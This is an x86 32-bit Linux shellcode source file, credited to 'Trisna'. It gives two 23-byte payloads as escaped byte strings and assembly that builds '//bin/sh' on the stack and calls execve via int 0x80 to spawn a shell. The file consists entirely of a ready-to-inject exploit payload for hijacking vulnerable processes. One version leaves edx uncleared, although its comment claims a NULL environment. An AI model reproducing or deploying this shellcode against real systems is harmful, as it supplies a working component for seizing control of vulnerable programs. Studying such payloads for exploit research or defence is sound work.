
; x32 bit shellcode by Trisna
; 23 bytes long

; Version1:
; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80

; Version2:
; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

section .text
global _start

_start:
	xor eax, eax
	push eax		; string terminator

	; //bin/sh
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp		; move stack buffer to ebx

	; fill //bin/sh in the second parameter.
	push eax
	push ebx
	mov ecx, esp

	; set the syscall number.
	mov al, 0xb		; execve
	int 0x80

	; execve("/bin/sh", ["/bin/sh"], NULL)
